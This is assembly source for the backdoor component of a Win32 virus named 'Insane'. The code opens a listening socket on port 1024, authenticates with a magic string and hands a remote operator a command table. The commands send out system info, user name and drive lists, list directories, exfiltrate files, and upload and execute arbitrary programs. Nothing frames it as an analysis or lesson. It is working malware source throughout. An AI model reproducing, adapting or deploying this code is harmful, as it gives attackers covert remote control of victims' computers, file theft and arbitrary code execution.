   ; TCP/IP Backdoor for Win32.Insane

   Port    =   1024            ; Binding Port
   Block   =   1024

   InitTcpImports  proc
           mov     [cantcp][ebp],0

       lea eax,[tcplib][ebp]
       Call    [LoadLibrary][ebp],eax
       xchg    eax,ebx
       lea esi,[needf][ebp]
       lea edi,[WSAStartup][ebp]
       mov ecx,ixnum
   Inname: push    ecx esi edi
       Call    [GetProcAddress][ebp],ebx,esi
       pop edi
       or  eax,eax
       jz  notcp
       stosd
       pop esi
   findzero:
       lodsb
       cmp al,0
       jnz findzero
       pop ecx
       loop    Inname

       lea eax,[AddLib][ebp]
       Call    [LoadLibrary][ebp],eax
       xchg    eax,ebx
       lea eax,[UserName][ebp]
       Call    [GetProcAddress][ebp],ebx,eax
       mov [GetUserName][ebp],eax
           mov     [cantcp][ebp],1

           ret
   InitTcpImports  endp

   cantcp  db      ?

   TcpInstall  proc
           cmp     [cantcp][ebp],0
           jz      notcp

       lea eax,[wsadata][ebp]
       call    [WSAStartup][ebp],VERSION1_1,eax
       or  eax,eax
       jne     notcp

       mov     ax,VERSION1_1
       cmp     ax,word ptr [wsadata.mVersion][ebp]
       jb  qclean

       lea edi,[sockaddr][ebp]
       mov ecx,16
       xor eax,eax
       cld
   rep stosb

       Call    [socket][ebp],AF_INET,SOCK_STREAM,PCL_NONE
       cmp eax,SOCK_ERR
       jz  qclean
       mov [sock][ebp],eax
       lea ebx,[Msg][ebp]
       Call    [setsockopt][ebp],eax,IPPROTO_TCP,TCP_NODELAY,EBX,4
       Call    [htons][ebp],Port
       mov 2 ptr [sockaddr.sin_port][ebp],ax
       mov 2 ptr [sockaddr.sin_family][ebp],AF_INET
       lea eax,[sockaddr][ebp]
       Call    [bind][ebp],[sock][ebp],eax,16
       cmp eax,SOCK_ERR
       jz  closesock
       mov 4 ptr [Ebp2][ebp],ebp
       lea eax,[MySock][ebp]
       lea ebx,[free][ebp]
       Call    [CreateThread][ebp],0,50000,eax,0,0,ebx
       jmp notcp
   closesock:
       Call    [closesocket][ebp],[sock][ebp]
   qclean:
       Call    [WSACleanup][ebp]
   notcp:  ret
   TcpInstall  endp

   Msg db  'WI v'
       db  iver1 +'0'
       db  '.'
       db  iver2 +'0',13,10
   Msgl    equ $ - Msg

   Err db  'Error.',13,10
   Errl    equ $ - Err

   freeb   db  ?

   MySock  proc
       mov ebp,12345678h
   Ebp2    equ $ - 4
   nuser:  Call    [listen][ebp],[sock][ebp],1
       Call    [accept][ebp],[sock][ebp],0,0
       mov [sock2][ebp],eax
       lea eax,[cmd][ebp]
       push    eax
       Call    [recv][ebp],[sock2][ebp],eax,4,0
       pop eax
       cmp 4 ptr [eax],'ISNA'
       jnz DoOut
       lea eax,[Msg][ebp]
       Call    [send][ebp],[sock2][ebp],eax,Msgl,0
       Call    GetTcpPlugs
   msgloop:lea eax,[cmd][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,4,0
       or  eax,eax
       jz  JustDisconnect
       inc eax
       jz  JustDisconnect
       dec eax
       mov eax,[cmd][ebp]
       cmp eax,CmdNum
       jae TryPlugin
       lea ebx,[cmdtbl][eax*4][ebp]
       mov eax,[ebx]
       add eax,ebp
       call    eax
       jmp msgloop
   TryPlugin:
       Call    xTcpPlugin
       or  eax,eax
       jnz ShowError
       lea eax,[okay][ebp]
       jmp SendCmd
   ShowError:
       lea eax,[Err][ebp]
   SendCmd:
       Call    [send][ebp],[sock2][ebp],eax,6,0
       jmp msgloop
   JustDisconnect:
       lea eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0
   DoOut:  Call    [closesocket][ebp],[sock2][ebp]
       jmp nuser
   OffTcp: lea eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0
       Call    [closesocket][ebp],[sock2][ebp]
       Call    [closesocket][ebp],[sock][ebp]
       Call    [WSACleanup][ebp]
       Call    [ExitThread][ebp],0
   MySock  endp

   cmd dd  ?

   cmdtbl  dd  offset GetInfo          ; 0
       dd  offset UploadAndExec        ; 1
       dd  offset DownloadFiles        ; 2
       dd  offset ShowDir          ; 3
       dd  offset OffTcp           ; 4
       dd  offset JustDisconnect       ; 5
       dd  offset DownloadPlugin       ; 6
   CmdNum  equ ($ - cmdtbl) shr 2

   sorry   db  'NoSup.'
   okay    db  'CMD.OK'
   ;-----------------
   GetInfo proc
       mov [ExVer][ebp],verl

       lea eax,[ExVer][ebp]
       Call    [GetVersionEx][ebp],eax

       lea eax,[ExVer][ebp]
       Call    [send][ebp],[sock2][ebp],eax,verl,0

       lea eax,[CurDir][ebp]
       Call    [GetWindowsDirectory][ebp],eax,512

       lea eax,[CurDir][ebp]
       Call    [send][ebp],[sock2][ebp],eax,512,0

       mov ebx,[GetUserName][ebp]
       or  ebx,ebx
       jz  GiveUnknown

       lea eax,[CurDir][ebp]
       lea ebx,[dlen][ebp]
       mov 4 ptr [ebx],512
       Call    [GetUserName][ebp],eax,ebx
       or  eax,eax
       jnz SendX
   GiveUnknown:
       lea esi,[unkn][ebp]
       mov ecx,unknl
       lea edi,[CurDir][ebp]
   rep movsb
   SendX:  lea eax,[CurDir][ebp]
       Call    [send][ebp],[sock2][ebp],eax,512,0
       or  eax,eax
       jz  SendX

       lea eax,[FullName][ebp]
       push    eax
       Call    [GetLogicalDriveStrings][ebp],600,eax
       pop esi
   SendDrives:
       lodsb
       dec esi
       cmp al,0
       jz  NoMoreDrives
       push    esi esi esi
       lea eax,[ex0][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       pop esi
       Call    [send][ebp],[sock2][ebp],esi,16,0
       pop esi
       Call    [GetDriveType][ebp],esi
       mov [dlen][ebp],eax
       lea eax,[dlen][ebp]
       Call    [send][ebp],[sock2][ebp],eax,4,0

       pop esi
   Skipz:  lodsb
       cmp al,0
       jnz Skipz
       jmp SendDrives
   NoMoreDrives:
       lea eax,[ex1][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       or  eax,eax
       jz  NoMoreDrives

       lea eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0

       ret
   GetInfo endp

   ;-----------------
   unkn    db  'Unknown.',0
   unknl   equ $ - unkn

   ex0 db  0
   ex1 db  1

   UploadAndExec   proc
           Call    DownLoadFile

       lea eax,[dfile][ebp]
       lea ebx,[psi][ebp]
       lea ecx,[pi][ebp]
       Call    [CreateProcess][ebp],eax,0,0,0,0,NORMAL_PRIORITY_CLASS,0,0,ebx,ecx
       or  eax,eax
       jz  jdel
   waitq:  Call    [GetProcessVersion][ebp],[ProcessID][ebp]
       or  eax,eax
       jnz waitq

   jdel:   lea eax,[dfile][ebp]
       Call    [DeleteFile][ebp],eax

       lea eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0
       ret
   xnoupload:
       pop eax
   noupload:
       lea eax,[ex1][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       or  eax,eax
       jz  noupload
       lea eax,[Err][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0
       ret
   UploadAndExec   endp
   ;-----------------

   DownloadFiles   proc
       lea eax,[CurDir][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,512,0
       lea esi,[CurDir][ebp]
       mov edi,esi
   FindPath:
       lodsb
       cmp al,0
       jz  AllSkipped
       cmp al,'\'
       jnz FindPath
       mov edi,esi
       jmp FindPath
   AllSkipped:
       mov ecx,edi
       lea esi,[CurDir][ebp]
       sub ecx,esi
       lea edi,[FullName][ebp]
       or  ecx,ecx
       jnz something
       mov al,'.'
       stosb
       xor eax,eax
       jmp StoreB
   something:
   rep movsb
   StoreB: stosb                   ; Zero byte

       lea eax,[cDir][ebp]
       Call    [GetCurrentDirectory][ebp],512,eax
       lea eax,[FullName][ebp]
       Call    [SetCurrentDirectory][ebp],eax

       lea eax,[xFindData][ebp]
       lea ebx,[CurDir][ebp]
       Call    [FindFirstFile][ebp],ebx,eax
       inc eax
       jz  NoFiles
       dec eax
       mov [xFData][ebp],eax

   OneMore:
       lea eax,[ex0][ebp]              ; One more file
       Call    [send][ebp],[sock2][ebp],eax,1,0
       inc eax
       jz  DoOut
       dec eax
       jz  OneMore

       lea eax,[xcFileName][ebp]
       Call    UpLoadFile

       lea eax,[xFindData][ebp]
       Call    [FindNextFile][ebp],[xFData][ebp],eax
       or  eax,eax
       jnz OneMore
       Call    [FindClose][ebp],[xFData][ebp]
   NoFiles:
       lea eax,[ex1][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       or  eax,eax
       jz  NoFiles

       lea eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0

       lea eax,[cDir][ebp]
       Call    [SetCurrentDirectory][ebp],eax

       ret
   DownloadFiles   endp
   ;-----------------
   AnyFile db  '*.*',0

   ShowDir proc
       lea eax,[CurDir][ebp]
       Call    [GetCurrentDirectory][ebp],512,eax

       lea eax,[FullName][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,512,0

       lea eax,[FullName][ebp]
       Call    [SetCurrentDirectory][ebp],eax

       lea eax,[FullName][ebp]
       Call    [GetCurrentDirectory][ebp],512,eax

       lea eax,[FullName][ebp]
       Call    [send][ebp],[sock2][ebp],eax,512,0

       lea eax,[xFindData][ebp]
       lea ebx,[AnyFile][ebp]
       Call    [FindFirstFile][ebp],ebx,eax
       inc eax
       jz  SendNoFiles
   ShowFiles:
       dec eax
       mov [xFData][ebp],eax
   ShowX:  lea eax,[ex0][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0

       lea eax,[xcFileName][ebp]
       Call    [send][ebp],[sock2][ebp],eax,260,0
       lea eax,[xnFileSizeLow][ebp]
       Call    [send][ebp],[sock2][ebp],eax,4,0
       lea eax,[xdwFileAttributes][ebp]
       Call    [send][ebp],[sock2][ebp],eax,4,0

       lea eax,[xFindData][ebp]
       Call    [FindNextFile][ebp],[xFData][ebp],eax
       or  eax,eax
       jnz ShowX
       Call    [FindClose][ebp],[xFData][ebp]
   SendNoFiles:
       lea eax,[CurDir][ebp]
       Call    [SetCurrentDirectory][ebp],eax
       lea eax,[ex1][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       lea eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0
       ret
   ShowDir endp
   ;-----------------
   DownLoadFile    proc
       lea eax,[dfile][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,260,0
       lea eax,[dlen][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,4,0
       lea eax,[dfile][ebp]
       Call    [CreateFile][ebp],eax,GENERIC_WRITE,SHARE_READ,0,CREATE_ALWAYS,0,0
       inc eax
       jz  xnoupload
       dec eax
       xchg    eax,ebx
       lea eax,[ex0][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       mov ecx,[dlen][ebp]
       cmp ecx,Block
       jb  jcopy
   downl:  push    ecx
       lea eax,[fblock][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,Block,0
       lea edx,[fblock][ebp]
       lea ecx,[free][ebp]
       Call    [WriteFile][ebp],ebx,edx,eax,ecx,0
       pop ecx
       or  eax,eax
       jz  baddown
   jcopy:  sub ecx,Block
       cmp ecx,Block
       jae downl
       lea eax,[fblock][ebp]
       Call    [recv][ebp],[sock2][ebp],eax,ecx,0
       lea edx,[fblock][ebp]
       lea ecx,[free][ebp]
       Call    [WriteFile][ebp],ebx,edx,eax,ecx,0
       Call    [CloseHandle][ebp],ebx
           ret
   baddown:Call    [CloseHandle][ebp],ebx
       pop eax
       jmp jdel
   DownLoadFile    endp

   xName   dd  ?

   UpLoadFile    proc
       mov [xName][ebp],eax
       Call    [CreateFile][ebp],eax,GENERIC_READ,SHARE_READ,0,OPEN_EXISTING,0,0
       inc eax
       jz  noupload
       dec eax
       xchg    eax,ebx

       lea eax,[ex0][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0

       mov eax,[xName][ebp]
       Call    [send][ebp],[sock2][ebp],eax,260,0  ; Name

       Call    [FSeek][ebp],ebx,0,0,2
       mov [dlen][ebp],eax
       Call    [FSeek][ebp],ebx,0,0,0

       lea eax,[dlen][ebp]
       Call    [send][ebp],[sock2][ebp],eax,4,0    ; FileSize

       mov ecx,[dlen][ebp]
       cmp ecx,Block
       jb  jucopy
   upload: push    ecx
       lea eax,[fblock][ebp]
       lea edx,[free][ebp]
       Call    [ReadFile][ebp],ebx,eax,Block,edx,0
       mov eax,[free][ebp]
       lea edx,[fblock][ebp]
       Call    [send][ebp],[sock2][ebp],edx,eax,0

       pop ecx
       sub ecx,Block
       cmp ecx,Block
       jae upload
   jucopy: lea edx,[fblock][ebp]
       lea eax,[free][ebp]
       push    ecx
       Call    [ReadFile][ebp],ebx,edx,ecx,eax,0
       pop ecx
       lea eax,[fblock][ebp]
       Call    [send][ebp],[sock2][ebp],eax,ecx,0

       Call    [CloseHandle][ebp],ebx
           ret
   UpLoadFile    endp
